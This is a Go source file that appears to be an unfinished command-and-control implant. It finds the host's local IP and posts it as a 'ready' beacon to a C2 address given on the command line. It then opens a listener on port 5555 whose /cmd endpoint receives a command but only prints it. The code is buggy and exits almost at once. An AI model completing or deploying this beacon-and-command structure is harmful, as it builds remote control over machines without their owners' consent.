package main

import (
	"flag"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
)

func findLocalAddress(ips []net.IP) []string {
	//192.168.0.?
	//10.?.?.?
	var LocalIps []string
	for _, ip := range ips {
		ipStr := ip.String()
		octet_array := strings.Split(ipStr, ".")
		for i, octet := range octet_array {
			octet_int, _ := strconv.Atoi(octet)
			if octet_int == 192 {
				octet_int_two, _ := strconv.Atoi(octet_array[i+1])
				octet_int_three, _ := strconv.Atoi(octet_array[i+2])
				if octet_int_two == 168 && octet_int_three == 0 {
					LocalIps = append(LocalIps, ipStr)
					break
				}
			}
			if octet_int == 10 {
				LocalIps = append(LocalIps, ipStr)
			}

		}

	}
	return LocalIps
}

func GetIPs() []net.IP {
	ifaces, _ := net.Interfaces()
	var ips []net.IP
	// handle err
	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		// handle err
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			ips = append(ips, ip)
			//fmt.Println(ip)
			//fmt.Println(addrs) read ip with mask

		}
	}
	return ips
}

// port - 1234
func main() {
	ip_addr := flag.String("ip", "localhost", "ip addres of c2")
	//endpoint := flag.String("endpoint", "", "endpoint c2")

	flag.Parse()

	//sendReadySignal(ip_addr)
	go startServer()
	sendReadySignal(ip_addr)
	time.Sleep(100 * time.Millisecond)
}
func sendReadySignal(ip *string) {
	c2_addr := "http://" + *ip + ":1234/ready"
	local_ips := GetIPs()
	local_IP := findLocalAddress(local_ips)[0]
	local_IP = local_IP + ":5555"

	fmt.Printf(local_IP)
	fmt.Printf("\n")
	body := strings.NewReader(fmt.Sprintf(`
	{
		"ip":"%s"
	}
	`, local_IP))

	resp, err := http.Post(c2_addr, "application/json", body)
	if err != nil {
		fmt.Printf("Error with post request")
	}
	resp.Body.Close()
	fmt.Printf("Status: " + resp.Status + "\n")
	/*
		var jsonData = []byte(`{
			"ip":"localhost:5555"
		}`)
			request, error := http.NewRequest("POST", c2_addr, bytes.NewBuffer(jsonData))
			request.Header.Set("Content-Type", "application/json; charset=UTF-8")

			client := &http.Client{}
			response, error := client.Do(request)
			if error != nil {
				panic(error)
			}
			defer response.Body.Close()

			fmt.Println("response Status:", response.Status)
			fmt.Println("response Headers:", response.Header)
			body, _ := ioutil.ReadAll(response.Body)
			fmt.Println("response Body:", string(body))
	*/

}

//Server

func startServer() {
	fmt.Printf("Server started")
	http.HandleFunc("/cmd", func(w http.ResponseWriter, r *http.Request) {
		fmt.Printf("cmd endpoint \n")
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		cmd := r.URL.Query().Get("m")

		fmt.Printf(cmd)
	})

	http.ListenAndServe(":5555", nil)
}
